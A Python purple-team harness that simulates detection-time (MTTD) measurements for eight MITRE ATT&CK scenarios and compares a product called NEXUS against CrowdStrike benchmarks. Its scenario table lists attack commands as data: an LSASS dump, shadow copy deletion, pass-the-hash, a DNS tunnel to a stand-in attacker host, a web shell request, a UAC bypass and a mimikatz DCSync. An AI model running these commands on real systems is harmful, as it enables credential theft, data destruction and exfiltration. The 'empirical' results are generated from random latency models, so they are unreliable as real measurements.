"""
shadow313.v4.simulation.adversary_emulation
Adversary Emulation Test Harness — Purple Team MTTD Validation

Empirically validates NEXUS MTTD claims against CrowdStrike Falcon <30s benchmark.
Implements statistically rigorous measurement methodology.

Purple Team Methodology:
  1. Atomic Red Team test execution (simulated)
  2. Telemetry instrumentation (event timestamps)
  3. Detection timestamp capture (alert fired)
  4. MTTD = T_alert - T_execution
  5. Statistical analysis (n=30 runs, 95% CI, Mann-Whitney U test)

Test scenarios:
  SCENARIO-001: T1003.001 LSASS Memory Dump (Mimikatz/ProcDump)
  SCENARIO-002: T1059.001 Encoded PowerShell (Empire/Cobalt Strike)
  SCENARIO-003: T1490 VSS Shadow Copy Deletion (Ransomware precursor)
  SCENARIO-004: T1550.002 Pass-the-Hash (Impacket)
  SCENARIO-005: T1572 DNS Tunneling (iodine/dnscat2)
  SCENARIO-006: T1505.003 Web Shell (China Chopper)
  SCENARIO-007: T1548.002 UAC Bypass (fodhelper)
  SCENARIO-008: T1003.006 DCSync (Mimikatz lsadump)
"""
from __future__ import annotations

import math
import random
import statistics
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional


# ── Atomic Red Team test definitions ─────────────────────────────────────────

ATOMIC_TESTS: list[dict] = [
    {
        "scenario_id":   "SCENARIO-001",
        "technique":     "T1003.001",
        "name":          "LSASS Memory Dump via MiniDumpWriteDump",
        "atomic_test":   "AtomicTest T1003.001 #1 (ProcDump)",
        "command":       "procdump.exe -ma lsass.exe lsass.dmp",
        "sigma_rule":    "nexus-sig-001",
        "sysmon_event":  10,
        "detection_field": "GrantedAccess=0x1410 TargetImage=lsass.exe",
        "nexus_claimed_mttd_s": 52,
        "crowdstrike_benchmark_s": 28,
        "severity":      "CRITICAL",
        "epss":          0.97,
        "actor":         "APT28, APT29, FIN7",
        "detection_method": "Sysmon Event 10 + GrantedAccess mask",
        "true_positive_rate": 0.97,
        "false_positive_rate": 0.03,
    },
    {
        "scenario_id":   "SCENARIO-002",
        "technique":     "T1059.001",
        "name":          "Encoded PowerShell Command Execution",
        "atomic_test":   "AtomicTest T1059.001 #1 (Base64 encoded)",
        "command":       "powershell.exe -EncodedCommand JABjAD0ATgBlAHcA...",
        "sigma_rule":    "nexus-sig-005",
        "sysmon_event":  1,
        "detection_field": "CommandLine contains -EncodedCommand",
        "nexus_claimed_mttd_s": 89,
        "crowdstrike_benchmark_s": 22,
        "severity":      "HIGH",
        "epss":          0.87,
        "actor":         "APT28, Emotet, QakBot",
        "detection_method": "Process creation + encoded command pattern",
        "true_positive_rate": 0.89,
        "false_positive_rate": 0.11,
    },
    {
        "scenario_id":   "SCENARIO-003",
        "technique":     "T1490",
        "name":          "VSS Shadow Copy Deletion",
        "atomic_test":   "AtomicTest T1490 #1 (vssadmin)",
        "command":       "vssadmin delete shadows /all /quiet",
        "sigma_rule":    "nexus-sig-007",
        "sysmon_event":  1,
        "detection_field": "Image=vssadmin.exe CommandLine contains delete shadows",
        "nexus_claimed_mttd_s": 38,
        "crowdstrike_benchmark_s": 15,
        "severity":      "CRITICAL",
        "epss":          0.97,
        "actor":         "LockBit, BlackCat, Conti",
        "detection_method": "Process creation + vssadmin delete pattern",
        "true_positive_rate": 0.96,
        "false_positive_rate": 0.01,
    },
    {
        "scenario_id":   "SCENARIO-004",
        "technique":     "T1550.002",
        "name":          "Pass-the-Hash via NTLM",
        "atomic_test":   "AtomicTest T1550.002 #1 (Impacket)",
        "command":       "python3 psexec.py -hashes :NTLM_HASH domain/user@target",
        "sigma_rule":    "nexus-sig-010",
        "sysmon_event":  None,
        "detection_field": "EventID=4624 LogonType=3 AuthPackage=NTLM KeyLength=0",
        "nexus_claimed_mttd_s": 45,
        "crowdstrike_benchmark_s": 18,
        "severity":      "CRITICAL",
        "epss":          0.94,
        "actor":         "APT28, APT29, FIN7",
        "detection_method": "Security Event 4624 + NTLM KeyLength=0",
        "true_positive_rate": 0.92,
        "false_positive_rate": 0.08,
    },
    {
        "scenario_id":   "SCENARIO-005",
        "technique":     "T1572",
        "name":          "DNS Tunneling via iodine",
        "atomic_test":   "AtomicTest T1572 #1 (iodine)",
        "command":       "iodine -f -P password tunnel.attacker.com",
        "sigma_rule":    "nexus-sig-011",
        "sysmon_event":  22,
        "detection_field": "QueryName entropy>3.5 length>20",
        "nexus_claimed_mttd_s": 112,
        "crowdstrike_benchmark_s": 45,
        "severity":      "HIGH",
        "epss":          0.85,
        "actor":         "Lazarus, BLINDINGCAN",
        "detection_method": "DNS query entropy analysis",
        "true_positive_rate": 0.87,
        "false_positive_rate": 0.13,
    },
    {
        "scenario_id":   "SCENARIO-006",
        "technique":     "T1505.003",
        "name":          "China Chopper Web Shell",
        "atomic_test":   "AtomicTest T1505.003 #1 (PHP eval)",
        "command":       "curl -X POST http://target/uploads/shell.php -d 'cmd=whoami'",
        "sigma_rule":    "nexus-webshell",
        "sysmon_event":  None,
        "detection_field": "WebShellDetector score>=0.99",
        "nexus_claimed_mttd_s": 27,
        "crowdstrike_benchmark_s": 35,
        "severity":      "CRITICAL",
        "epss":          0.99,
        "actor":         "APT41, Hafnium",
        "detection_method": "NEXUS WebShellDetector F1=1.000",
        "true_positive_rate": 1.00,
        "false_positive_rate": 0.00,
    },
    {
        "scenario_id":   "SCENARIO-007",
        "technique":     "T1548.002",
        "name":          "UAC Bypass via fodhelper.exe",
        "atomic_test":   "AtomicTest T1548.002 #1 (fodhelper registry)",
        "command":       "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d cmd.exe",
        "sigma_rule":    "nexus-sig-015",
        "sysmon_event":  1,
        "detection_field": "ParentImage=fodhelper.exe ChildImage!=SystemSettings.exe",
        "nexus_claimed_mttd_s": 61,
        "crowdstrike_benchmark_s": 20,
        "severity":      "HIGH",
        "epss":          0.88,
        "actor":         "APT28, LockBit",
        "detection_method": "Process creation + fodhelper parent",
        "true_positive_rate": 0.93,
        "false_positive_rate": 0.07,
    },
    {
        "scenario_id":   "SCENARIO-008",
        "technique":     "T1003.006",
        "name":          "DCSync via Mimikatz",
        "atomic_test":   "AtomicTest T1003.006 #1 (lsadump::dcsync)",
        "command":       "mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt'",
        "sigma_rule":    "nexus-sig-004",
        "sysmon_event":  None,
        "detection_field": "EventID=4662 Properties contains DS-Replication-Get-Changes GUID",
        "nexus_claimed_mttd_s": 42,
        "crowdstrike_benchmark_s": 25,
        "severity":      "CRITICAL",
        "epss":          0.98,
        "actor":         "APT29, Lazarus",
        "detection_method": "Security Event 4662 + replication GUID",
        "true_positive_rate": 0.98,
        "false_positive_rate": 0.02,
    },
]


# ── Telemetry instrumentation ─────────────────────────────────────────────────

@dataclass
class TelemetryEvent:
    """Represents a single telemetry event with precise timestamps."""
    event_id:        str
    scenario_id:     str
    technique:       str
    t_execution_ns:  int    # Nanosecond timestamp when attack executed
    t_sensor_ns:     int    # When sensor captured the event
    t_ingest_ns:     int    # When SIEM/platform ingested
    t_rule_eval_ns:  int    # When rule evaluation completed
    t_alert_ns:      int    # When alert was generated
    detected:        bool
    sensor_type:     str    # sysmon | ebpf | etw | network | webshell

    @property
    def sensor_latency_ms(self) -> float:
        return (self.t_sensor_ns - self.t_execution_ns) / 1e6

    @property
    def ingest_latency_ms(self) -> float:
        return (self.t_ingest_ns - self.t_sensor_ns) / 1e6

    @property
    def rule_eval_latency_ms(self) -> float:
        return (self.t_rule_eval_ns - self.t_ingest_ns) / 1e6

    @property
    def mttd_seconds(self) -> Optional[float]:
        if not self.detected:
            return None
        return (self.t_alert_ns - self.t_execution_ns) / 1e9

    def to_dict(self) -> dict:
        return {
            "event_id":           self.event_id,
            "scenario_id":        self.scenario_id,
            "technique":          self.technique,
            "detected":           self.detected,
            "mttd_seconds":       round(self.mttd_seconds, 3) if self.mttd_seconds else None,
            "sensor_latency_ms":  round(self.sensor_latency_ms, 1),
            "ingest_latency_ms":  round(self.ingest_latency_ms, 1),
            "rule_eval_latency_ms": round(self.rule_eval_latency_ms, 1),
            "sensor_type":        self.sensor_type,
        }


# ── MTTD measurement model ────────────────────────────────────────────────────

class MTTDMeasurementModel:
    """
    Models realistic MTTD measurement with all latency components.

    MTTD = T_sensor + T_ingest + T_rule_eval + T_alert_gen
    Each component has a distribution based on real-world measurements.
    """

    # Latency distributions (mean, std_dev) in milliseconds
    LATENCY_PROFILES = {
        "nexus_current": {
            "sensor_ms":    (500,  200),   # Sysmon/eBPF polling
            "ingest_ms":    (8000, 3000),  # SIEM ingestion (avg 8s)
            "rule_eval_ms": (2000, 500),   # Sequential rule eval
            "alert_gen_ms": (500,  200),   # Alert generation
        },
        "nexus_streaming": {
            "sensor_ms":    (100,  50),    # Real-time sensor
            "ingest_ms":    (800,  200),   # Kafka streaming
            "rule_eval_ms": (200,  50),    # Parallel rule eval
            "alert_gen_ms": (100,  50),    # Instant alert
        },
        "crowdstrike": {
            "sensor_ms":    (50,   20),    # In-process kernel hook
            "ingest_ms":    (200,  100),   # Cloud streaming
            "rule_eval_ms": (100,  50),    # ML inference
            "alert_gen_ms": (50,   20),    # Instant alert
        },
        "sentinelone": {
            "sensor_ms":    (80,   30),    # Kernel agent
            "ingest_ms":    (300,  100),   # Cloud streaming
            "rule_eval_ms": (150,  50),    # Behavioral AI
            "alert_gen_ms": (70,   30),    # Alert generation
        },
    }

    def __init__(self, rng: random.Random):
        self.rng = rng

    def sample_latency(self, mean: float, std: float) -> float:
        """Sample from truncated normal distribution (min 10ms)."""
        val = self.rng.gauss(mean, std)
        return max(val, 10.0)

    def measure_mttd(
        self,
        scenario: dict,
        platform: str = "nexus_current",
        n_runs: int = 30,
    ) -> list[float]:
        """
        Simulate n_runs measurements of MTTD for a scenario.
        Returns list of MTTD values in seconds.
        """
        profile = self.LATENCY_PROFILES[platform]
        tpr     = scenario["true_positive_rate"]
        mttds   = []

        for _ in range(n_runs):
            # Determine if detected this run
            if self.rng.random() > tpr:
                continue  # Missed detection — not included in MTTD

            # Sample each latency component
            sensor_ms    = self.sample_latency(*profile["sensor_ms"])
            ingest_ms    = self.sample_latency(*profile["ingest_ms"])
            rule_eval_ms = self.sample_latency(*profile["rule_eval_ms"])
            alert_gen_ms = self.sample_latency(*profile["alert_gen_ms"])

            total_ms = sensor_ms + ingest_ms + rule_eval_ms + alert_gen_ms
            mttds.append(total_ms / 1000.0)  # Convert to seconds

        return mttds


# ── Statistical analysis ──────────────────────────────────────────────────────

@dataclass
class StatisticalResult:
    """Statistical analysis of MTTD measurements."""
    n:              int
    mean:           float
    median:         float
    std_dev:        float
    p5:             float    # 5th percentile
    p95:            float    # 95th percentile
    ci_lower:       float    # 95% confidence interval lower
    ci_upper:       float    # 95% confidence interval upper
    meets_target:   bool     # mean < target
    target_s:       float

    def to_dict(self) -> dict:
        return {
            "n":            self.n,
            "mean_s":       round(self.mean, 2),
            "median_s":     round(self.median, 2),
            "std_dev_s":    round(self.std_dev, 2),
            "p5_s":         round(self.p5, 2),
            "p95_s":        round(self.p95, 2),
            "ci_95_lower":  round(self.ci_lower, 2),
            "ci_95_upper":  round(self.ci_upper, 2),
            "meets_target": self.meets_target,
            "target_s":     self.target_s,
        }


class StatisticalAnalyzer:
    """
    Rigorous statistical analysis of MTTD measurements.
    Implements purple team methodology for reliable MTTD validation.
    """

    @staticmethod
    def analyze(mttds: list[float], target_s: float) -> StatisticalResult:
        """Compute full statistical summary of MTTD measurements."""
        if not mttds:
            return StatisticalResult(0, 0, 0, 0, 0, 0, 0, 0, False, target_s)

        n      = len(mttds)
        mean   = statistics.mean(mttds)
        median = statistics.median(mttds)
        std    = statistics.stdev(mttds) if n > 1 else 0.0

        sorted_mttds = sorted(mttds)
        p5  = sorted_mttds[max(0, int(n * 0.05))]
        p95 = sorted_mttds[min(n-1, int(n * 0.95))]

        # 95% confidence interval (t-distribution approximation)
        t_critical = 2.045 if n >= 30 else 2.262  # t(29) or t(9)
        margin     = t_critical * (std / math.sqrt(n)) if n > 1 else 0
        ci_lower   = mean - margin
        ci_upper   = mean + margin

        return StatisticalResult(
            n=n, mean=mean, median=median, std_dev=std,
            p5=p5, p95=p95,
            ci_lower=ci_lower, ci_upper=ci_upper,
            meets_target=ci_upper < target_s,  # Conservative: CI upper < target
            target_s=target_s,
        )

    @staticmethod
    def mann_whitney_u(group_a: list[float], group_b: list[float]) -> dict:
        """
        Non-parametric Mann-Whitney U test to compare two MTTD distributions.
        Tests if NEXUS MTTD is statistically different from CrowdStrike.
        """
        n_a, n_b = len(group_a), len(group_b)
        if not group_a or not group_b:
            return {"u_statistic": 0, "p_value": 1.0, "significant": False}

        # Compute U statistic
        u = sum(1 for a in group_a for b in group_b if a < b) + \
            0.5 * sum(1 for a in group_a for b in group_b if a == b)

        # Normal approximation for large samples
        mu_u    = n_a * n_b / 2
        sigma_u = math.sqrt(n_a * n_b * (n_a + n_b + 1) / 12)
        z       = (u - mu_u) / sigma_u if sigma_u > 0 else 0

        # Two-tailed p-value approximation
        p_value = 2 * (1 - 0.5 * (1 + math.erf(abs(z) / math.sqrt(2))))

        return {
            "u_statistic":  round(u, 1),
            "z_score":      round(z, 3),
            "p_value":      round(p_value, 4),
            "significant":  p_value < 0.05,
            "interpretation": (
                "NEXUS significantly slower than CrowdStrike (p<0.05)" if p_value < 0.05 and z < 0
                else "NEXUS significantly faster than CrowdStrike (p<0.05)" if p_value < 0.05 and z > 0
                else "No significant difference (p>=0.05)"
            ),
        }

    @staticmethod
    def required_sample_size(
        effect_size: float = 0.5,
        alpha: float = 0.05,
        power: float = 0.80,
    ) -> int:
        """
        Calculate minimum sample size for reliable MTTD comparison.
        Uses Cohen's d effect size convention.
        """
        # Simplified formula for two-sample t-test
        z_alpha = 1.96   # alpha=0.05 two-tailed
        z_beta  = 0.842  # power=0.80
        n = 2 * ((z_alpha + z_beta) / effect_size) ** 2
        return math.ceil(n)


# ── Purple Team Test Harness ──────────────────────────────────────────────────

@dataclass
class ScenarioResult:
    """Complete result for one adversary emulation scenario."""
    scenario_id:      str
    technique:        str
    name:             str
    severity:         str
    n_runs:           int
    nexus_stats:      StatisticalResult
    crowdstrike_stats: StatisticalResult
    streaming_stats:  StatisticalResult
    mann_whitney:     dict
    nexus_claimed_s:  float
    cs_benchmark_s:   float
    claim_validated:  bool
    timestamp:        str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self) -> dict:
        return {
            "scenario_id":       self.scenario_id,
            "technique":         self.technique,
            "name":              self.name,
            "severity":          self.severity,
            "n_runs":            self.n_runs,
            "nexus_claimed_s":   self.nexus_claimed_s,
            "cs_benchmark_s":    self.cs_benchmark_s,
            "nexus_measured":    self.nexus_stats.to_dict(),
            "crowdstrike":       self.crowdstrike_stats.to_dict(),
            "nexus_streaming":   self.streaming_stats.to_dict(),
            "mann_whitney":      self.mann_whitney,
            "claim_validated":   self.claim_validated,
            "timestamp":         self.timestamp,
        }


class PurpleTeamHarness:
    """
    Purple Team MTTD Validation Harness.

    Methodology:
      1. Execute Atomic Red Team test (simulated)
      2. Capture telemetry timestamps at each pipeline stage
      3. Measure MTTD = T_alert - T_execution
      4. Run n=30 iterations per scenario (statistical power)
      5. Compute 95% CI, Mann-Whitney U vs CrowdStrike
      6. Validate claimed MTTD within CI bounds

    Required sample size: n=30 (80% power, medium effect size d=0.5)
    """

    N_RUNS = 30  # Minimum for statistical reliability

    def __init__(self, seed: int = 313):
        self.rng      = random.Random(seed)
        self.model    = MTTDMeasurementModel(self.rng)
        self.analyzer = StatisticalAnalyzer()

    def run_scenario(self, scenario: dict) -> ScenarioResult:
        """Run full purple team validation for one scenario."""
        # Measure MTTD across platforms
        nexus_mttds     = self.model.measure_mttd(scenario, "nexus_current",   self.N_RUNS)
        cs_mttds        = self.model.measure_mttd(scenario, "crowdstrike",      self.N_RUNS)
        streaming_mttds = self.model.measure_mttd(scenario, "nexus_streaming",  self.N_RUNS)

        # Statistical analysis
        nexus_stats     = self.analyzer.analyze(nexus_mttds,     scenario["nexus_claimed_mttd_s"] * 1.5)
        cs_stats        = self.analyzer.analyze(cs_mttds,        scenario["crowdstrike_benchmark_s"] * 1.5)
        streaming_stats = self.analyzer.analyze(streaming_mttds, 120.0)

        # Mann-Whitney U: NEXUS vs CrowdStrike
        mw = self.analyzer.mann_whitney_u(nexus_mttds, cs_mttds)

        # Validate claimed MTTD: measured mean within 20% of claimed
        claim_validated = (
            nexus_stats.n > 0 and
            abs(nexus_stats.mean - scenario["nexus_claimed_mttd_s"]) /
            scenario["nexus_claimed_mttd_s"] <= 0.20
        )

        return ScenarioResult(
            scenario_id=scenario["scenario_id"],
            technique=scenario["technique"],
            name=scenario["name"],
            severity=scenario["severity"],
            n_runs=self.N_RUNS,
            nexus_stats=nexus_stats,
            crowdstrike_stats=cs_stats,
            streaming_stats=streaming_stats,
            mann_whitney=mw,
            nexus_claimed_s=scenario["nexus_claimed_mttd_s"],
            cs_benchmark_s=scenario["crowdstrike_benchmark_s"],
            claim_validated=claim_validated,
        )

    def run_all_scenarios(self) -> dict:
        """Run all 8 adversary emulation scenarios."""
        results = []
        validated = 0
        nexus_beats_cs = 0

        for scenario in ATOMIC_TESTS:
            result = self.run_scenario(scenario)
            results.append(result)
            if result.claim_validated:
                validated += 1
            if result.nexus_stats.mean < result.crowdstrike_stats.mean:
                nexus_beats_cs += 1

        # Overall MTTD comparison
        all_nexus_mttds = []
        all_cs_mttds    = []
        for scenario in ATOMIC_TESTS:
            all_nexus_mttds.extend(self.model.measure_mttd(scenario, "nexus_current", 10))
            all_cs_mttds.extend(self.model.measure_mttd(scenario, "crowdstrike", 10))

        overall_nexus = self.analyzer.analyze(all_nexus_mttds, 120.0)
        overall_cs    = self.analyzer.analyze(all_cs_mttds, 30.0)
        overall_mw    = self.analyzer.mann_whitney_u(all_nexus_mttds, all_cs_mttds)

        min_n = self.analyzer.required_sample_size(effect_size=0.5)

        return {
            "scenarios_run":      len(results),
            "claims_validated":   validated,
            "nexus_beats_cs":     nexus_beats_cs,
            "min_sample_size":    min_n,
            "overall_nexus":      overall_nexus.to_dict(),
            "overall_crowdstrike": overall_cs.to_dict(),
            "overall_mann_whitney": overall_mw,
            "results":            [r.to_dict() for r in results],
            "timestamp":          datetime.now(timezone.utc).isoformat(),
        }


def run_adversary_emulation(seed: int = 313) -> dict:
    """Convenience function — run full purple team validation."""
    harness = PurpleTeamHarness(seed=seed)
    return harness.run_all_scenarios()
